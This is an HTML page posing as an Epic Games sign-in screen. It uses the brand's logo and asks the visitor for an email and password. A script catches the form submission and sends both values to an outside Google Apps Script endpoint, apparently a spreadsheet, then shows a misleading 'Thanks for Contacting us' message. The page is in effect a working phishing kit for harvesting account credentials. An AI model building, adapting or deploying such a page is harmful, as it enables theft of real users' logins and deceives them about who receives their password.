<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Epic games</title>
    <link rel='icon' href='logo.svg' />
  
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">

    <style>
            
            body{
                background: rgb(18, 18, 18)

            }
            


            .register .nav-tabs .nav-link:hover{
                border: none;
            }
            .text-align{
                margin-top: -3%;
                margin-bottom: -9%;

                padding: 10%;
                margin-left: 30%;
            }
            .form-new{
                margin-bottom: 10%;
                margin-right: 0%;
                margin-left: 0%;
            }
            .register-heading{
                color: #ffffff;
            }
            .register-heading h1{
                margin-left: 10%;
                margin-bottom: 10%;
                color: #3b3b3b;
            }
            .register{
                background: -webkit-linear-gradient(left, #343a40,#343a40);
                margin-top: 3%;
                padding: 3%;
           
            }
            .btnSubmit
            {
                border-radius: 5px;
                width: 50%;
                padding: 1.5%;
                color: #fff;
                background-color: #2e2d2d;
                border: none;
                cursor: pointer;
                margin-right: 6%;
                color: rgb(246, 246, 252);
                margin-top: 4%;
            }

            .epicgames{
                text-align: center;
            }

           

    
    </style>

</head>
<body>
    











        <section class="vh-100 gradient-custom">
            <div class="container py-5 h-100">
              <div class="row d-flex justify-content-center align-items-center h-100">
                <div class="col-12 col-md-8 col-lg-6 col-xl-5">
                  <div class="card bg-dark text-white" style="border-radius: 1rem;">
                    <div class="card-body p-5 text-center">
          









                        <div class="row">
                            <div class="col-md-12">
                                    <div class="tab-pane fade show active text-align form-new" id="home" role="tabpanel" aria-labelledby="home-tab">
                                    <div class="epicgames">
                                        <img src="logo.svg" width="75px" style="margin-bottom:10%;margin-top: 8%;" >
                                    <center><p class="register-heading">Please enter your Epic Games account!</p></center>
                                        </div>
                                        <div class="row register-form">
                                            <div class="col-md-12">
                                                <form method="post" autocomplete="off" name="google-sheet">
                                                    <div class="form-group">
                                                        <input type="text" name="Email" class="form-control" placeholder="Email" value="" required=""/>
                                                    </div>
                                                    <div class="form-group">
                                                        <input type="text" name="Jelszo" class="form-control" placeholder="Password" value="" required=""/>
                                                    </div>
                                                    <div class="form-group">
                                                        <input type="submit" name="submit" class="btnSubmit btn-block" value="Login" />
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                            </div>
                        </div>




          
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </section>
              
        
     
      </section>
    

    </div>








          <script>
            const scriptURL = 'https://script.google.com/macros/s/AKfycbwUmh1WCd9TYTGnxDdUr0izxkka5MxZfpbJbk3oYm0gAjHNhWaH9YZmS8ssq5hB126y/exec'
            const form = document.forms['google-sheet']
          
            form.addEventListener('submit', e => {
              e.preventDefault()
              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
                .catch(error => console.error('Error!', error.message))
            })
          </script>

        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>

</body>
</html>
